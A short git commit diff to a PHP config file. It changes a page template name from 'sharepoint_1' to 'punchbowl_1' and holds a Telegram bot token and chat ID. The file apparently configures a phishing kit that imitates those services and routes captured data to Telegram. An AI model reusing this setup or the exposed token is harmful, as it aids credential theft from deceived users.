838dcf29b135d6d0fe94d32ac15e50076b859034
lorrettavandenburgkow90-commits <lorrettavandenburgkow90@gmail.com>
2026-06-23 14:16:00 +0100

    Update config.php

--- config.php
+++ config.php
@@ -7,6 +7,6 @@ $api_prefix = "awzfywkm";
 $telegram_bot_token = "8821840739:AAE9-7eB8-X2ype9qUxab7y4xLwotzCcIx4";
 $telegram_chat_id = "8793948257";
 
-$page_name = "sharepoint_1";
+$page_name = "punchbowl_1";
 
 ?>
